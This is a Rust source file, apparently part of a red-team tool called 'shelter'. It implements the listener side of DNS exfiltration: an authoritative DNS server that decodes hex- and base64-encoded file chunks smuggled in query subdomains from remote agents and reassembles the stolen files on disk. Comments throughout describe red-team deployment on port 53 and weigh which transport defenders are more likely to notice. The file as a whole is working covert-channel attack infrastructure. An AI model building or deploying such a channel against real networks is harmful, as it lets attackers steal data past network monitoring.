use std::str::FromStr;

use async_trait::async_trait;
use hickory_resolver::Name;
use hickory_server::{
    authority::MessageResponseBuilder,
    proto::{
        op::{Header, LowerQuery, MessageType, OpCode},
        rr::{LowerName, RData, Record},
    },
    server::{Request, RequestHandler, ResponseHandler, ResponseInfo},
};

/// Transport protocol for the DNS server.
///
/// DNS exfiltration can occur over either TCP or UDP. UDP is faster but less reliable
/// for large payloads, while TCP provides reliable in-order delivery but may be slower.
///
/// The chosen protocol determines:
/// - How DNS queries are received and responded to
/// - Packet size limitations (UDP has stricter limits than TCP)
/// - Network detection patterns (some defenders monitor for unusual DNS patterns)
#[derive(clap::ValueEnum, Copy, Clone, Debug, PartialEq, Eq)]
pub enum Protocol {
    /// Use TCP for DNS transport - more reliable for large payloads
    TCP,
    /// Use UDP for DNS transport - faster but smaller packet sizes
    UDP,
}

/// CLI configuration for the DNS server transport.
///
/// This struct captures the configuration needed to run a DNS server that receives
/// exfiltrated file portions encoded as subdomain names. The server acts as an
/// authoritative DNS resolver for a specified domain, allowing remote agents to
/// transmit data through DNS queries.
///
/// ## Configuration Parameters
///
/// - **protocol**: TCP or UDP transport (default: UDP for speed)
/// - **listen_addr**: Socket address to bind (default: 127.0.0.1:1053)
/// - **server_domain**: The DNS zone this server is authoritative for
///
/// ## Usage Example
///
/// ```bash
/// shelter dns-server --protocol udp --listen 0.0.0.0:53 --domain exfil.internal
/// ```
///
/// This would make the server authoritative for `exfil.internal` and listen on all
/// interfaces on the standard DNS port.
#[derive(Debug, clap::Args)]
pub struct DNSServerTypeSubCommand {
    /// The transport protocol to use (TCP or UDP).
    ///
    /// UDP is faster but limited by packet size (~512 bytes without EDNS0).
    /// TCP provides larger MTU and guaranteed delivery but may be detected more easily.
    /// Default: UDP
    #[arg(short='p', long="protocol", required=false, default_value_t=Protocol::UDP, value_enum)]
    pub protocol: Protocol,

    /// Socket address the DNS server should bind to (host:port).
    ///
    /// Port 53 requires elevated privileges; 1053 is useful for testing.
    /// Default: 127.0.0.1:1053 (local testing)
    /// Red team deployment: 0.0.0.0:53 or specific interface
    #[arg(
        short = 'l',
        long = "listen",
        required = false,
        default_value = "127.0.0.1:1053"
    )]
    pub listen_addr: std::net::SocketAddr,

    /// The root domain the server will serve as authoritative.
    ///
    /// Exfiltrated data arrives as subdomains of this domain. For example, if
    /// server_domain = "exfil.internal", then agents will send queries like:
    /// - `r7365637265742e7478743a616263313233.exfil.internal` (root node)
    /// - `66657478743a303a48656c6c6f.exfil.internal` (chunk data)
    ///
    /// The server extracts the subdomain portion, hex-decodes it, base64-decodes it,
    /// and parses it as a Node.
    /// Default: runner-shelter.top
    #[arg(
        short = 'd',
        long = "domain",
        required = false,
        default_value = "runner-shelter.top"
    )]
    pub server_domain: String,
}

#[derive(Debug, Clone)]
/// Internal DNS request handler for processing exfiltration queries.
///
/// This struct manages the processing of incoming DNS queries for the configured zone.
/// It maintains the authoritative zone name and a channel reference for forwarding
/// decoded file portions to the background processor.
///
/// ## Payload Extraction
///
/// For each DNS query, the handler:
/// 1. Extracts the subdomain portion (removing the root zone suffix)
/// 2. Removes dots from the subdomain (DNS query transport adds dots)
/// 3. Hex-decodes the resulting string
/// 4. Base64-decodes the result
/// 5. Parses the UTF-8 string as a Node (root or file chunk)
/// 6. Forwards the Node to the transfer_channel
/// 7. Returns a TXT "ACK" response
///
/// ## Example
///
/// Query: `72736563726574.exfil.internal` (where exfil.internal is the root_zone)
/// 1. Extract subdomain: `72736563726574`
/// 2. Hex decode: `rsecret` (partial example)
/// 3. Base64 decode: original colon-delimited fields
/// 4. Parse: Extract node type and fields
struct DNSHandler {
    /// The lower-cased DNS zone name that this handler is authoritative for.
    /// Queries for subdomains of this zone are processed for exfiltration.
    root_zone: LowerName,
    /// Channel used to forward parsed Node instances to the background processor.
    /// Exfiltration data flows: DNS query → subdomain extraction → decoding → Node → channel
    transfer_channel: tokio::sync::mpsc::Sender<crate::Node>,
}

impl DNSHandler {
    /// Create a new DNS handler for the specified exfiltration domain.
    ///
    /// ## Parameters
    ///
    /// - `exfil_domain`: The DNS zone this handler will be authoritative for.
    ///   Example: "exfil.internal"
    /// - `transfer_channel`: MPSC sender for forwarding decoded Node instances
    ///   to the background file assembly handler
    ///
    /// ## Setup
    ///
    /// - The domain is parsed and lowercased for case-insensitive zone matching
    /// - All queries to subdomains of `exfil_domain` are processed
    /// - Queries to other domains result in NXDOMAIN responses
    fn new(exfil_domain: String, transfer_channel: tokio::sync::mpsc::Sender<crate::Node>) -> Self {
        DNSHandler {
            root_zone: LowerName::from(Name::from_str(exfil_domain.as_str()).unwrap()),
            transfer_channel,
        }
    }

    /// Process a DNS query targeting the configured root zone.
    ///
    /// This handler implements the core exfiltration decoding logic:
    ///
    /// ## Decoding Pipeline
    ///
    /// 1. **Subdomain Extraction**: Remove the root zone suffix from the query name
    ///    - Input: `72736563726574.exfil.internal`
    ///    - After removing `.exfil.internal.`: `72736563726574`
    /// 2. **Dot Removal**: Strip dots added by DNS transport
    ///    - DNS adds dots to delimit labels; these are removed
    /// 3. **Node Parsing**: Call `Node::try_from()` which performs:
    ///    - Hex decode: Convert hex string to bytes
    ///    - Base64 decode: Decode the hex result
    ///    - UTF-8 conversion: Parse decoded bytes as UTF-8 text
    ///    - Field splitting: Parse colon-delimited fields
    ///    - Type matching: Create Root or FileChunk node
    /// 4. **Channel Send**: Forward parsed Node to background processor
    /// 5. **Response**: Return TXT "ACK" record to acknowledge receipt
    ///
    /// ## Error Handling
    ///
    /// If decoding or parsing fails, the error is converted to DNS error
    /// and returned to the caller, which generates a SERVFAIL response.
    async fn handle_root_zone(
        &self,
        query: &LowerQuery,
    ) -> Result<RData, crate::error::app::AppError> {
        // Extract subdomain by removing the root zone and trailing/leading dots
        let subdomain = query
            .name()
            .to_string()
            .replace(format!(".{}.", self.root_zone.to_string()).as_str(), "");
        log::info!("Handling root zone query for subdomain: {}", subdomain);

        // Remove dots that DNS transport may have added
        let decoded_payload = subdomain.replace(".", "");

        // Parse the subdomain as a Node (this performs hex→base64→utf8→field parsing)
        self.transfer_channel
            .send(crate::Node::try_from(decoded_payload)?)
            .await?;

        // Return TXT record acknowledging successful reception
        Ok(RData::TXT(hickory_server::proto::rr::rdata::txt::TXT::new(
            vec!["ACK".to_string()],
        )))
    }

    /// Process an incoming DNS request and generate an appropriate response.
    ///
    /// This method validates the request, processes any queries for the authoritative zone,
    /// and constructs a DNS response. It implements the full DNS query handling pipeline:
    ///
    /// ## Request Validation
    ///
    /// 1. Verify OpCode is Query (not Update, Notify, etc.)
    /// 2. Verify MessageType is Query (not Response or other)
    /// 3. Log source IP and message details for debugging
    ///
    /// ## Response Construction
    ///
    /// 1. Create response builder from request
    /// 2. Set authoritative (AA) flag since we're authoritative for root_zone
    /// 3. Process each query:
    ///    - If query is for a subdomain of root_zone: call handle_root_zone
    ///    - Otherwise: return NXDOMAIN error
    /// 4. Collect answer records and send response
    ///
    /// ## Error Mapping
    ///
    /// - Invalid OpCode → DNSError::InvalidOpCode
    /// - Invalid MessageType → DNSError::InvalidMessageType
    /// - Query for unknown zone → NXDOMAIN response
    /// - Exfiltration decode error → SERVFAIL response
    async fn handle_request<R: ResponseHandler>(
        &self,
        request: &Request,
        mut response_handler: R,
    ) -> Result<ResponseInfo, crate::error::dns::DNSError> {
        log::info!(
            "Received DNS request from {}: {:?} [{:?}]",
            request.src(),
            request.op_code(),
            request.message_type()
        );

        if request.op_code() != OpCode::Query {
            return Err(crate::error::dns::DNSError::InvalidOpCode(
                request.op_code(),
            ));
        }

        if request.message_type() != MessageType::Query {
            return Err(crate::error::dns::DNSError::InvalidMessageType(
                request.message_type(),
            ));
        }
        let builder = MessageResponseBuilder::from_message_request(request);
        let mut header = Header::response_from_request(request.header());
        header.set_authoritative(true);
        let mut records: Vec<_> = Vec::new();

        for query in request.queries() {
            match query.name() {
                name if self.root_zone.zone_of(name) => {
                    records.push(Record::from_rdata(
                        name.into(),
                        60,
                        self.handle_root_zone(query).await?,
                    ));
                }
                _ => {
                    log::warn!("Received DNS query for unknown zone: {}", query.name());
                    return Err(crate::error::dns::DNSError::InvalidZone(
                        query.name().clone(),
                    ));
                }
            }
        }

        let response = builder.build(header, records.iter(), &[], &[], &[]);
        Ok(response_handler.send_response(response).await?)
    }
}

#[async_trait]
impl RequestHandler for DNSHandler {
    /// Main entry point invoked by the hickory DNS server for each incoming request.
    ///
    /// This trait method wraps the internal `handle_request` implementation and converts
    /// any errors into appropriate DNS response codes while preserving logging:
    ///
    /// ## Error Handling
    ///
    /// - **InvalidZone** (query for unknown domain): Maps to NXDOMAIN response
    /// - **Other errors** (invalid opcode, message type, etc.): Maps to SERVFAIL
    /// - All errors are logged before conversion for diagnostic purposes
    ///
    /// ## Response Codes
    ///
    /// - NOERROR (0): Successfully processed exfiltration query, ACK returned
    /// - NXDOMAIN (3): Query targeted domain not under server's authority
    /// - SERVFAIL (2): Server error during exfiltration decoding or processing
    async fn handle_request<R: ResponseHandler>(
        &self,
        request: &Request,
        response: R,
    ) -> ResponseInfo
    where
        R: ResponseHandler + Send,
    {
        match self.handle_request(request, response).await {
            Ok(info) => info,
            Err(error) => {
                log::error!("Error handling DNS request: {}", error);
                match error {
                    crate::error::dns::DNSError::InvalidZone(_) => {
                        let mut header = Header::response_from_request(request.header());
                        header.set_response_code(hickory_server::proto::op::ResponseCode::NXDomain);
                        header.into()
                    }
                    _ => {
                        let mut header = Header::new();
                        header.set_response_code(hickory_server::proto::op::ResponseCode::ServFail);
                        header.into()
                    }
                }
            }
        }
    }
}

impl DNSServerTypeSubCommand {
    /// Start the DNS server and begin receiving exfiltration queries.
    ///
    /// This method instantiates the DNS server with the configured protocol and binds
    /// it to the specified address. It runs indefinitely, processing incoming DNS queries
    /// and forwarding exfiltrated data to the background processor.
    ///
    /// ## Server Initialization
    ///
    /// 1. Create DNSHandler with the configured domain and transfer_channel
    /// 2. Create a ServerFuture with the handler
    /// 3. Register socket or listener based on protocol (UDP or TCP)
    /// 4. Run indefinitely until shutdown
    ///
    /// ## Protocol Details
    ///
    /// - **UDP**: Binds a UDP socket; faster but limited to ~512 bytes/query (unless EDNS0)
    /// - **TCP**: Binds a TCP listener with 10-second timeout; larger MTU available
    ///
    /// ## Exfiltration Flow
    ///
    /// 1. Remote agent constructs DNS query with exfiltration data in subdomain
    /// 2. Query arrives at configured listen_addr
    /// 3. DNSHandler extracts subdomain, decodes payload
    /// 4. Handler sends Node to transfer_channel
    /// 5. Background processor receives Node and accumulates file chunks
    /// 6. On End chunk, file is reassembled and written to disk
    /// 7. TXT "ACK" response returned to agent
    ///
    /// ## Error Handling
    ///
    /// - Binding errors (port in use, permission denied): Returned as std::io::Error
    /// - Query processing errors: Converted to DNS error codes (NXDOMAIN, SERVFAIL)
    /// - Invalid queries: Logged and responded to appropriately
    pub async fn handle(
        &self,
        transfer_channel: tokio::sync::mpsc::Sender<crate::Node>,
    ) -> std::io::Result<()> {
        log::info!(
            "Starting DNS server on {} for domain {} over {:?}",
            self.listen_addr,
            self.server_domain,
            self.protocol
        );
        let dns_handler: DNSHandler = DNSHandler::new(self.server_domain.clone(), transfer_channel);
        let mut dns_server = hickory_server::server::ServerFuture::new(dns_handler);

        match self.protocol {
            Protocol::UDP => {
                dns_server.register_socket(tokio::net::UdpSocket::bind(self.listen_addr).await?);
            }
            Protocol::TCP => {
                dns_server.register_listener(
                    tokio::net::TcpListener::bind(self.listen_addr).await?,
                    std::time::Duration::from_secs(10),
                );
            }
        };

        dns_server.block_until_done().await?;

        Ok(())
    }
}
